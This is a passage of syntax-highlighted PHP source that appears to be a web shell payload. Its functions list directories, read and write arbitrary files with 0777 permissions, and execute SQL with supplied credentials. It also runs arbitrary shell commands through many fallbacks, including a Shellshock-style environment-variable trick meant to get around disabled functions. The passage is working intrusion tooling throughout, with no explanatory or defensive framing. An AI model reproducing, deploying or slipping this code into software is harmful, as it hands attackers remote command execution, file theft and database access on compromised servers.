<span class="k">function</span> <span class="n">getFile</span><span class="p">(){</span>
    <span class="nv">$dir</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s1">'dirName'</span><span class="p">);</span>
    <span class="nv">$dir</span><span class="o">=</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="o">@</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="o">?</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span><span class="o">:</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span><span class="s1">'/'</span><span class="p">,</span><span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
    <span class="nv">$dir</span><span class="mf">.</span><span class="o">=</span><span class="s2">"/"</span><span class="p">;</span>
    <span class="nv">$path</span><span class="o">=</span><span class="nv">$dir</span><span class="p">;</span>
    <span class="nv">$allFiles</span> <span class="o">=</span> <span class="o">@</span><span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
    <span class="nv">$data</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$allFiles</span><span class="o">!=</span><span class="kc">null</span><span class="p">){</span>
        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"ok"</span><span class="p">;</span>
        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nv">$path</span><span class="p">;</span>
        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$allFiles</span> <span class="k">as</span> <span class="nv">$fileName</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$fileName</span><span class="o">!=</span><span class="s2">"."</span><span class="o">&amp;&amp;</span><span class="nv">$fileName</span><span class="o">!=</span><span class="s2">".."</span><span class="p">){</span>
                <span class="nv">$fullPath</span> <span class="o">=</span> <span class="nv">$path</span><span class="mf">.</span><span class="nv">$fileName</span><span class="p">;</span>
                <span class="nv">$lineData</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
                <span class="nb">array_push</span><span class="p">(</span><span class="nv">$lineData</span><span class="p">,</span><span class="nv">$fileName</span><span class="p">);</span>
                <span class="nb">array_push</span><span class="p">(</span><span class="nv">$lineData</span><span class="p">,</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">)</span><span class="o">?</span><span class="s2">"1"</span><span class="o">:</span><span class="s2">"0"</span><span class="p">);</span>
                <span class="nb">array_push</span><span class="p">(</span><span class="nv">$lineData</span><span class="p">,</span><span class="nb">date</span><span class="p">(</span><span class="s2">"Y-m-d H:i:s"</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">)));</span>
                <span class="nb">array_push</span><span class="p">(</span><span class="nv">$lineData</span><span class="p">,</span><span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">));</span>
                <span class="nv">$fr</span><span class="o">=</span><span class="p">(</span><span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">)</span><span class="o">?</span><span class="s2">"R"</span><span class="o">:</span><span class="s2">""</span><span class="p">)</span><span class="mf">.</span><span class="p">(</span><span class="o">@</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">)</span><span class="o">?</span><span class="s2">"W"</span><span class="o">:</span><span class="s2">""</span><span class="p">)</span><span class="mf">.</span><span class="p">(</span><span class="o">@</span><span class="nb">is_executable</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">)</span><span class="o">?</span><span class="s2">"X"</span><span class="o">:</span><span class="s2">""</span><span class="p">);</span>
                <span class="nb">array_push</span><span class="p">(</span><span class="nv">$lineData</span><span class="p">,(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fr</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">?</span><span class="nv">$fr</span><span class="o">:</span><span class="s2">"F"</span><span class="p">));</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">,</span><span class="nv">$lineData</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
            <span class="p">}</span>

        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"Path Not Found Or No Permission!"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">readFileContent</span><span class="p">(){</span>
    <span class="nv">$fileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"fileName"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">)){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"is_readable"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="s2">"No Permission!"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"File Not Found"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">uploadFile</span><span class="p">(){</span>
    <span class="nv">$fileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"fileName"</span><span class="p">);</span>
    <span class="nv">$fileValue</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"fileValue"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="nv">$fileValue</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
        <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
        <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"fail"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">newDir</span><span class="p">(){</span>
    <span class="nv">$dir</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"dirName"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span><span class="mo">0777</span><span class="p">,</span><span class="kc">true</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
        <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"fail"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">newFile</span><span class="p">(){</span>
    <span class="nv">$fileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"fileName"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">""</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
        <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"fail"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">function_existsEx</span><span class="p">(</span><span class="nv">$functionName</span><span class="p">){</span>
    <span class="nv">$d</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">"disable_functions"</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$d</span><span class="p">)){</span>
        <span class="nv">$d</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nv">$d</span><span class="o">=</span><span class="nb">array_map</span><span class="p">(</span><span class="s1">'trim'</span><span class="p">,</span><span class="nb">array_map</span><span class="p">(</span><span class="s1">'strtolower'</span><span class="p">,</span><span class="nv">$d</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$functionName</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nb">is_callable</span><span class="p">(</span><span class="nv">$functionName</span><span class="p">)</span><span class="o">&amp;&amp;!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$functionName</span><span class="p">,</span><span class="nv">$d</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">execCommand</span><span class="p">(){</span>
    <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
    <span class="nv">$cmdLine</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"cmdLine"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s2">"/"</span><span class="p">){</span>
        <span class="o">@</span><span class="nb">putenv</span><span class="p">(</span><span class="s2">"PATH="</span><span class="mf">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">"PATH"</span><span class="p">)</span><span class="mf">.</span><span class="s2">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="o">@</span><span class="nb">putenv</span><span class="p">(</span><span class="s2">"PATH="</span><span class="mf">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">"PATH"</span><span class="p">)</span><span class="mf">.</span><span class="s2">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$result</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"runshellshock"</span><span class="p">)){</span>
        <span class="k">function</span> <span class="n">runshellshock</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s2">"/"</span> <span class="o">&amp;&amp;</span> <span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'putenv'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'error_log'</span><span class="p">)</span> <span class="o">||</span> <span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'mail'</span><span class="p">)))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nb">readlink</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">),</span> <span class="s2">"bash"</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">FALSE</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">tempnam</span><span class="p">(</span><span class="nb">sys_get_temp_dir</span><span class="p">(),</span> <span class="s1">'as'</span><span class="p">);</span>
                    <span class="nb">putenv</span><span class="p">(</span><span class="s2">"PHP_LOL=() { x; }; </span><span class="nv">$c</span><span class="s2"> &gt;</span><span class="nv">$tmp</span><span class="s2"> 2&gt;&amp;1"</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'error_log'</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nb">error_log</span><span class="p">(</span><span class="s2">"a"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nb">mail</span><span class="p">(</span><span class="s2">"a@127.0.0.1"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">"-bv"</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$output</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
        <span class="p">};</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'system'</span><span class="p">)){</span>
        <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$cmdLine</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'passthru'</span><span class="p">)){</span>
        <span class="nv">$result</span><span class="o">=@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmdLine</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'shell_exec'</span><span class="p">)){</span>
        <span class="nv">$result</span><span class="o">=@</span><span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmdLine</span><span class="p">);</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'exec'</span><span class="p">)){</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$cmdLine</span><span class="p">,</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
        <span class="nv">$result</span><span class="o">=</span><span class="nb">join</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'popen'</span><span class="p">)){</span>
        <span class="nv">$fp</span><span class="o">=@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$cmdLine</span><span class="p">,</span><span class="s1">'r'</span><span class="p">);</span>
        <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)){</span>
            <span class="nv">$result</span><span class="mf">.</span><span class="o">=@</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="o">@</span><span class="nb">pclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s1">'proc_open'</span><span class="p">)){</span>
        <span class="nv">$p</span> <span class="o">=</span> <span class="o">@</span><span class="nb">proc_open</span><span class="p">(</span><span class="nv">$cmdLine</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">),</span> <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)),</span> <span class="nv">$io</span><span class="p">);</span>
        <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">1</span><span class="p">])){</span>
            <span class="nv">$result</span><span class="mf">.</span><span class="o">=@</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">2</span><span class="p">])){</span>
            <span class="nv">$result</span><span class="mf">.</span><span class="o">=@</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
        <span class="o">@</span><span class="nb">proc_close</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">!=</span><span class="s2">"/"</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">class_exists</span><span class="p">(</span><span class="s2">"COM"</span><span class="p">)){</span>
        <span class="nv">$w</span><span class="o">=</span><span class="k">new</span> <span class="nc">COM</span><span class="p">(</span><span class="s1">'WScript.shell'</span><span class="p">);</span>
        <span class="nv">$e</span><span class="o">=</span><span class="nv">$w</span><span class="o">-&gt;</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$cmdLine</span><span class="p">);</span>
        <span class="nv">$so</span><span class="o">=</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">StdOut</span><span class="p">();</span>
        <span class="nv">$result</span><span class="mf">.</span><span class="o">=</span><span class="nv">$so</span><span class="o">-&gt;</span><span class="nf">ReadAll</span><span class="p">();</span>
        <span class="nv">$se</span><span class="o">=</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">StdErr</span><span class="p">();</span>
        <span class="nv">$result</span><span class="mf">.</span><span class="o">=</span><span class="nv">$se</span><span class="o">-&gt;</span><span class="nf">ReadAll</span><span class="p">();</span>
    <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"pcntl_fork"</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"pcntl_exec"</span><span class="p">)){</span>
        <span class="nv">$cmd</span><span class="o">=</span><span class="s2">"/bin/bash"</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)){</span>
            <span class="nv">$cmd</span><span class="o">=</span><span class="s2">"/bin/sh"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$commandFile</span><span class="o">=</span><span class="nb">sys_get_temp_dir</span><span class="p">()</span><span class="mf">.</span><span class="s2">"/"</span><span class="mf">.</span><span class="nb">time</span><span class="p">()</span><span class="mf">.</span><span class="s2">".log"</span><span class="p">;</span>
        <span class="nv">$resultFile</span><span class="o">=</span><span class="nb">sys_get_temp_dir</span><span class="p">()</span><span class="mf">.</span><span class="s2">"/"</span><span class="mf">.</span><span class="p">(</span><span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="mf">.</span><span class="s2">".log"</span><span class="p">;</span>
        <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$commandFile</span><span class="p">,</span><span class="nv">$cmdLine</span><span class="p">);</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nb">pcntl_fork</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
                <span class="nv">$args</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"-c"</span><span class="p">,</span> <span class="s2">"</span><span class="nv">$cmdLine</span><span class="s2"> &gt; </span><span class="nv">$resultFile</span><span class="s2">"</span><span class="p">);</span>
                <span class="nb">pcntl_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$args</span><span class="p">);</span>
                <span class="c1">// the child will only reach this point on exec failure,</span>
                <span class="c1">// because execution shifts to the pcntl_exec()ed command</span>
                <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$resultFile</span><span class="p">)){</span>
            <span class="nb">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$result</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$resultFile</span><span class="p">);</span>
        <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$commandFile</span><span class="p">);</span>
        <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$resultFile</span><span class="p">);</span>

    <span class="p">}</span><span class="k">elseif</span><span class="p">((</span><span class="nv">$result</span><span class="o">=</span><span class="nf">runshellshock</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span> <span class="nv">$cmdLine</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">))</span> <span class="p">{</span>

    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$result</span> <span class="mf">.</span><span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
    <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>

    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">execSql</span><span class="p">(){</span>
    <span class="nv">$dbType</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"dbType"</span><span class="p">);</span>
    <span class="nv">$dbHost</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"dbHost"</span><span class="p">);</span>
    <span class="nv">$dbPort</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"dbPort"</span><span class="p">);</span>
    <span class="nv">$username</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"dbUsername"</span><span class="p">);</span>
    <span class="nv">$password</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"dbPassword"</span><span class="p">);</span>
    <span class="nv">$execType</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"execType"</span><span class="p">);</span>
    <span class="nv">$execSql</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"execSql"</span><span class="p">);</span>
    <span class="nv">$charset</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"dbCharset"</span><span class="p">);</span>
    <span class="nv">$currentDb</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"currentDb"</span><span class="p">);</span>
    <span class="k">function</span>  <span class="n">mysqli_exec</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">){</span>
        <span class="c1">// 创建连接</span>
        <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$port</span><span class="p">);</span>
        <span class="c1">// Check connection</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$charset</span><span class="p">)){</span>
            <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">set_charset</span><span class="p">(</span><span class="nv">$charset</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">)){</span>
            <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">select_db</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">){</span>
            <span class="k">return</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$execType</span><span class="o">==</span><span class="s2">"update"</span><span class="p">){</span>
            <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">affected_rows</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$data</span><span class="o">=</span><span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
            <span class="k">while</span> <span class="p">(</span><span class="nv">$column</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_field</span><span class="p">()){</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$column</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">){</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
